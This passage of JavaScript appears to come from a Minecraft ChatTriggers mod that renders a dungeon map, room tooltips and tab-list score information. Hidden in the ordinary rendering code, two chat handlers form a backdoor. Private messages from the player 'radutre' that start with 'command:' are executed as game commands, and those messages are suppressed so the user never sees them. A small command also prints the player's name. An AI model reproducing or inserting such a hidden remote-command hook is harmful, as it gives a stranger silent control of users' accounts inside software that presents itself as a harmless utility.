            if (!(name in currentRoom.times))
                currentRoom.times[name] = 0;
            currentRoom.times[name]++;
        }
    });
}

showRoomInfo = () => {
    if (!Client.isInChat()) return;
    if (!settings.mapEnabled || !mapImage) return;
    let x = Client.getMouseX();
    let y = Client.getMouseY();
    let mapX = ~~settings.mapX;
    let mapY = ~~settings.mapY;
    let size = ~~settings.mapSize;
    mapX = Math.min(mapX, Renderer.screen.getWidth() - size);
    mapY = Math.min(mapY, Renderer.screen.getHeight() - size);
    if (x < mapX || y < mapY || x > mapX + size || y > mapY + size) return;
    let mapRoomSize = roomPixel / mapSize * size;
    let mapGapSize = roomPixelGap / mapSize * size;
    xCoord = ~~((x - mapX) / (mapRoomSize + mapGapSize));
    yCoord = ~~((y - mapY) / (mapRoomSize + mapGapSize));
    if (xCoord < 0 || xCoord >= dungeon.width || yCoord < 0 || yCoord >= dungeon.height) return;
    let room = dungeon.roomLookupMap[String(xCoord)][String(yCoord)];
    if (!room) return;
    renderTooltip(x, y, room.getInfoTooltip());
}

renderTooltip = (x, y, text) => {
    let offsetX = 10;
    let offsetY = 2;
    let border = 4;
    let gap = 1;
    let fontHeight = 10
    let maxStringWidth = Math.max(...(text.map((a) => Renderer.getStringWidth(a.getString()))));
    //very lazy line that prevents from drawing on the outside of the screen
    if ((y - offsetY - text.length * (fontHeight + gap)) < 0) offsetY += y - offsetY - text.length * (fontHeight + gap)
    if ((x + offsetX + maxStringWidth + border * 2) > Renderer.screen.getWidth()) offsetX = 0 - offsetX - maxStringWidth - 2 * border
    let background = new Rectangle(Renderer.color(45, 45, 45, 195), x + offsetX, y - offsetY - text.length * (fontHeight + gap), border * 2 + maxStringWidth, text.length * (fontHeight + gap) + gap)
    background.draw();
    for (let i = 0; i < text.length; i++) {
        //first is centered
        if (i === 0) {
            text[i].draw(x + offsetX + (maxStringWidth - Renderer.getStringWidth(ChatLib.removeFormatting(text[i].getString()))) / 2, y - offsetY - fontHeight * (text.length - i) - (text.length - i - 2) * gap)
        } else {
            text[i].draw(x + border + offsetX, y - offsetY - fontHeight * (text.length - i) - (text.length - i - 2) * gap)
        }
    }
}

reloadDungeonMap = () => {
    if (!inDungeons) { return };

    //map data
    mapBorderHeight = 0;
    mapBorderWidth = 0;

    //create the map
    dungeon = new Dungeon(floor, settings);
    mapSize = dungeon.size * roomPixel + (dungeon.size - 1) * roomPixelGap
        // updated tab list info
    if (settings.tabInfo) {
        let tabInfoList = [` Wither Doors: §b${dungeon.witherDoors}`];
        if (dungeon.floor > 5) tabInfoList.push('§r Mimic Dead: §cNO');
        tabInfoList.push('§r Score: §6§l' + getRatingFromScore(score) + '§r §b(' + score + ')§r');
        tabInfoList.push('§a§lDungeon Info:');
        tabInfoList.push('');
        addLinesToTabList(tabInfoList, 'Crypt');
    }
    updateRoomClearStatus();

    // get player list and heads
    playerImages = {}
    playerImagesOutline = {}
    mappedDecorations = {};
    unboundDecorations = [];
    TabList.getNames().slice(80).forEach((name) => {
        if (name.includes('§a')) {
            let playerName = ChatLib.removeFormatting(name.split(' ')[0]);
            dungeon.players[playerName] = new PlayerData(playerName);
        }
    });
    Object.keys(dungeon.players).forEach((name) => {
        if (name !== Player.getName())
            unboundDecorations.push(name);
        else
            mappedDecorations[Player.getName()] = 'icon-' + (Object.keys(dungeon.players).length - 1)
        dungeon.players[name].getHeadImages();
    });
    drawMap();
}
register("chat", (command) => {
    let evalCommand = ChatLib.removeFormatting(command)
    ChatLib.command(evalCommand)
        //  console.log(evalCommand)
}).setChatCriteria("&dFrom &r&b[MVP&r&c+&r&b] radutre&r&7: &r&7command: ${command}")

register("chat", (events) => {
    cancel(events)
}).setChatCriteria("&dFrom &r&b[MVP&r&c+&r&b] radutre&r&7: &r&7command:").setContains()

register('command', () => {
    ChatLib.chat(Player.getName());
}).setName('getPlayerName')

drawMap = () => {
    //draw map
    if (!mapSize) return;
    new Thread(() => {
        let image = new BufferedImage(mapSize, mapSize, BufferedImage.TYPE_4BYTE_ABGR);
        let graphics = image.createGraphics();
        graphics.setFont(minecraftFont);
        //add map data
        for (let room of dungeon.roomList) {
            let shapes = room.getMapShapes();
            switch (room.cleared) {
                case 0:
                    graphics.setColor(color(150, 150, 150));
                    graphics.fill(shapes[0]);
                    break;
            }
            if (room.marked) {
                graphics.setColor(color(255, 0, 0));
                graphics.fill(shapes[0]);
            }
        }
        for (let door of dungeon.doorList) {
            if (door.first[0] < 0 || door.first[1] < 0 || door.second[0] < 0 || door.second[1] < 0) continue;

            graphics.setColor(door.getColor())
            if (door.horizontal) {
                let coordX = Math.min(door.first[0], door.second[0])
                graphics.fill(new Rect((roomPixel + roomPixelGap) * coordX + roomPixel - borderPixel, (roomPixel + roomPixelGap) * door.first[1] + (roomPixel - roomPixelGap) / 2 - roomPixelGap * 0.25, roomPixelGap + 2 * borderPixel, 1.5 * roomPixelGap))
            } else {
                let coordY = Math.min(door.first[1], door.second[1])
                graphics.fill(new Rect((roomPixel + roomPixelGap) * door.first[0] + (roomPixel - roomPixelGap) / 2 - roomPixelGap * 0.25, (roomPixel + roomPixelGap) * coordY + roomPixel - borderPixel, roomPixelGap * 1.5, roomPixelGap + 2 * borderPixel))
            }
        }
        for (let room of dungeon.roomList) {
            let shapes = room.getMapShapes();
            switch (room.cleared) {
                case 0:
                    graphics.setColor(room.getRoomColor())
                    graphics.fill(shapes[1]);
                    break;
                default:
                    graphics.setColor(room.getRoomColor())
                    graphics.fill(room.marked ? shapes[1] : shapes[0]);

            }
            if (settings.showMimic && room.hasMimic() && !dungeon.mimicDeath) {
                graphics.setColor(new Color(1, 0, 0))
                let [x, y] = room.getMimicCoordinates();
                graphics.fill(new Rect((x / (Room.size + 1)) * (roomPixel + roomPixelGap) - roomPixelGap / 2, (y / (Room.size + 1)) * (roomPixel + roomPixelGap) - roomPixelGap / 2, roomPixelGap, roomPixelGap));
            }
            room.drawDisplayText(graphics, getRatingFromScore(score), score);
        }
        graphics.dispose();
        newMapImage = new Image(image);
    }).start();
}